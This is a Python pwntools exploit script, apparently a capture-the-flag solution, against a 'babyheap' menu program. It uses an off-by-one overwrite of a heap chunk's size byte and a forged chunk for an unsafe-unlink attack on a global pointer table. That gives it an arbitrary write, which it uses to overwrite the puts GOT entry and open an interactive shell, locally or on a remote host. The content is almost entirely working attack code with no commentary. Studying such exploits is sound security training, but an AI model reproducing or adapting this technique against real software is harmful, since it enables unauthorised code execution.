#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './babyheap'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def add(sz,data):
    ru(">>")
    sl("1")
    ru("size?")
    sl(str(sz))
    ru("content?")
    sl(data)

def delete(idx):
    ru(">>")
    sl("2")
    ru("index ?")
    sl(str(idx))

def edit(idx, data):
    ru(">>")
    sl("4")
    ru("index ?")
    sl(str(idx))
    ru("content ?")
    se(data)   

add(0x100-8,'0')
add(0x100-8,'1')
add(0x80-8,'2')
add(0x80-8,'3')

delete(1)

edit(0, '0'*(0x100-8) + '\x81')

add(0x180-8,'1')

edit(1,p64(0x00) + p64(0x00) + p64(0x602160+8-24) + p64(0x602160+8-16) + (0x100-8-32-8)*'1' + p64(0xf0) + p64(0x80))
delete(2)

edit(1,'A'*16 + p64(elf.got['puts']))

# debug()
sh = 0x40097F
edit(0, p64(sh))

p.interactive()